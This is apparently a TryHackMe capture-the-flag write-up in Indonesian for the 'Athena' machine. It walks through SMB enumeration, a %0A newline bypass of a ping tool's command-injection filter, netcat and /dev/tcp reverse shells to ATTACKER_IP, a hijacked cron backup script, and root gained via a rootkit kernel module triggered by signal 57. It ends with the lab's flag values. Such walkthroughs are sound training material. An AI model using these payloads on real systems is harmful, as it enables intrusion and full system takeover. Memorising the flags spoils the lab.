# Athena — TryHackMe Writeup

**Target:** Athena  
**Platform:** TryHackMe  
**Difficulty:** Medium  
**Kategori:** SMB, Web Enumeration, Command Injection, Kernel Module, Cron Job, Privilege Escalation

---

## Recon

Dimulai dengan Rustscan untuk melakukan port scanning.

```bash
rustscan -b 500 --scripts none -t 5000 -a TARGET_IP
```

Dilanjutkan dengan Nmap untuk melakukan enumerasi service.

```bash
nmap -sC -sV -T4 -p22,80,139,445 TARGET_IP
```

![port](images/port.png)

Terdapat SMB service yang berjalan. Saya mencoba melakukan enumerasi menggunakan `smbmap` dan `smbclient`, lalu menemukan file `msg_for_administrator.txt`.

```bash
smbmap -H TARGET_IP
smbclient //TARGET_IP/public -N
```

![smbmap](images/smbmap.png)

Setelah memindahkan file tersebut ke mesin saya, isinya adalah:

```text
Dear Administrator,

I would like to inform you that a new Ping system is being developed and I left the corresponding application in a specific path, which can be accessed through the following address: /myrouterpanel

Yours sincerely,

Athena
Intern
```

Dari file tersebut saya mendapatkan path baru `/myrouterpanel` dan kandidat username `Athena`. Karena itu, saya melakukan pivot kembali ke website untuk mengecek path tersebut.

Ternyata di sana terdapat aplikasi Ping Tools.

![pingtool](images/pingtool.png)

---

## Initial Foothold — Command Injection

Saat mencoba payload sederhana seperti:

```text
8.8.8.8 ; id
```

website mengarahkan saya ke halaman yang berisi tulisan `attempt hacking!`.

Hal ini menunjukkan bahwa aplikasi memiliki filter terhadap input tertentu.

Saya kemudian melakukan testing melalui proxy untuk melihat bentuk parameter yang dikirim. Request tersebut memiliki format:

```text
ip=INPUT&submit=
```

Setelah beberapa kali mencoba berbagai payload, saya menemukan cara untuk melewati filter menggunakan newline encoding `%0A`.

Payload:

```text
ip=1%0Aid&submit=
```

![proxy](images/proxy.png)

Setelah berhasil mengonfirmasi command injection, saya mencoba mendapatkan reverse shell.

Saya menggunakan Netcat karena command tersebut dapat dijalankan melalui injection setelah bypass newline ditemukan.

```text
ip=8%0Anc ATTACKER_IP 9004 -e /usr/bin/sh&submit=
```

![shell](images/shell.png)

Reverse shell berhasil didapatkan.

---

## Kernel Module Enumeration

Saat melakukan enumerasi, saya menemukan sebuah kernel module:

```text
/mnt/.../secret/venom.ko
```

Awalnya saya tidak memahami apa itu file `.ko` dan sama sekali belum memahami cara melakukan reverse engineering terhadap kernel module. Saya sempat mencoba melihat isinya, tetapi belum dapat memahami cara kerjanya.

Karena itu, saya menggunakan AI untuk membantu melakukan analisis terhadap binary tersebut.

Dari hasil analisis, ditemukan beberapa function yang menarik:

```text
hacked_kill
give_root
module_hide
module_show
get_syscall_table_bf
```

`hacked_kill()` terlihat memeriksa beberapa signal tertentu, dan hasil analisis menunjukkan bahwa signal `57` dapat mengarah ke `give_root()`. Function tersebut kemudian melakukan perubahan terhadap credential proses.

Pada saat itu saya belum dapat memverifikasi temuan tersebut karena module belum saya load dan saya juga belum memiliki privilege yang diperlukan. Karena itu, saya memarkir temuan ini dan melanjutkan enumerasi.

---

## Privilege Escalation — `www-data` → `athena`

Saat melakukan enumerasi lebih lanjut, saya menemukan proses yang menjalankan script backup:

```text
2026/08/20 21:54:28 CMD: UID=1001  PID=3211 | /bin/bash /usr/share/backup/backup.sh
2026/08/20 21:54:28 CMD: UID=1001  PID=3212 | /bin/bash /usr/share/backup/backup.sh
2026/08/20 21:54:28 CMD: UID=1001  PID=3213 | /bin/bash /usr/share/backup/backup.sh
2026/08/20 21:54:28 CMD: UID=1001  PID=3214 | /bin/bash /usr/share/backup/backup.sh
2026/08/20 21:54:28 CMD: UID=1001  PID=3215 | rm /home/athena/backup/*.sh
```

Permission script tersebut:

```text
-rwxr-xr-x 1 www-data athena 258 May 28  2023 /usr/share/backup/backup.sh
```

`www-data` merupakan owner dari script tersebut dan memiliki write permission. Di sisi lain, proses yang menjalankan script terlihat berjalan sebagai `UID=1001`, yaitu user `athena`.

Artinya, `www-data` dapat memodifikasi script yang nantinya dieksekusi dengan privilege `athena`.

Isi script:

```bash
#!/bin/bash
backup_dir_zip=~/backup
mkdir -p "$backup_dir_zip"

cp -r /home/athena/notes/* "$backup_dir_zip"
zip -r "$backup_dir_zip/notes_backup.zip" "$backup_dir_zip"

rm /home/athena/backup/*.txt
rm /home/athena/backup/*.sh

echo "Backup completed..."
```

Karena script tersebut dapat ditulis oleh user yang saya kontrol, saya mencoba menambahkan payload reverse shell:

```bash
echo 'bash -i >& /dev/tcp/ATTACKER_IP/9005 0>&1' >> /usr/share/backup/backup.sh
```

Saya kemudian menunggu hingga script tersebut dieksekusi kembali. Setelah sekitar satu menit, saya mendapatkan shell sebagai user `athena`.

![athena](images/athena.png)

---

## Privilege Escalation — Malicious Kernel Module

Setelah berhasil mendapatkan shell sebagai `athena`, saya melakukan pengecekan `sudo -l` dan menemukan:

```text
(root) NOPASSWD: /usr/sbin/insmod /mnt/.../secret/venom.ko
```

Di sini, temuan `venom.ko` yang sebelumnya saya parkir kembali menjadi relevan. Saya sekarang dapat menjalankan `insmod` terhadap module tersebut sebagai root.

Saya kemudian mengikuti hasil analisis AI sebelumnya dan mencoba melakukan trigger menggunakan signal `57`.

```bash
sudo /usr/sbin/insmod /mnt/.../secret/venom.ko
kill -57 $$
```

Setelah itu saya mengecek privilege:

```bash
id
```

Hasilnya:

```text
uid=0(root) gid=0(root) groups=0(root)
```

Berhasil mendapatkan root.

![root](images/root.png)

---

## Flags

### User Flag

```text
857c4a4fbac638afb6c7ee45eb3e1a28
```

### Root Flag

```text
aecd4a3497cd2ec4bc71a2315030bd48
```

